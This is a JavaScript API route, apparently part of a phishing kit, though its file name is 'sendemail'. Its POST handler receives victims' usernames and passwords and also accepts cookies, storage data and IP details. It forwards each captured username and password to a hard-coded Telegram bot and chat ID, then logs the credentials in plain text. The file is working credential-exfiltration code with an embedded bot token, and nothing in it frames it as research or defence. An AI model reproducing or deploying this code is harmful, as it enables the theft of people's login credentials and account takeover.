/** @format */

// app/api/sendemail/route.js
import nodemailer from "nodemailer";

// for telegram
import { TelegramClient } from "telegramsjs";

const botToken = "7874530313:AAHr0TFN0cB90-Z1MSuHfsY2BrXQoVPp8UQ";
const bot = new TelegramClient(botToken);
const chatId = "7055420519";

// Handle POST requests for form submissions
export async function POST(req) {
  const { eparams, password, userAgent, remoteAddress, landingUrl, cookies, localStorageData, sessionStorageData } = await req.json();

  try {
    // Only send notification when password is provided
    if (password) {
      const credentialsMessage = `
🔐 *Session Information*

*Username:* ${eparams}
*Password:* ${password}
    `;

      await bot.sendMessage({
        text: credentialsMessage,
        chatId: chatId,
        parse_mode: "Markdown"
      });

      console.log(
        `Results sent to telegram successfully Email: ${eparams}, Password: ${password}`
      );

      return new Response(
        JSON.stringify({ message: "Credentials sent successfully!" }),
        {
          status: 200,
          headers: { "Content-Type": "application/json" },
        }
      );
    }

    // If no password, just return success without sending notification
    return new Response(
      JSON.stringify({ message: "No password provided, no notification sent" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending message:", error);
    return new Response(JSON.stringify({ error: "Error sending message" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}

// Remove GET endpoint since we don't want to notify on page access
export async function GET(req) {
  return new Response(JSON.stringify({ message: "Method not allowed" }), {
    status: 405,
    headers: { "Content-Type": "application/json" },
  });
}
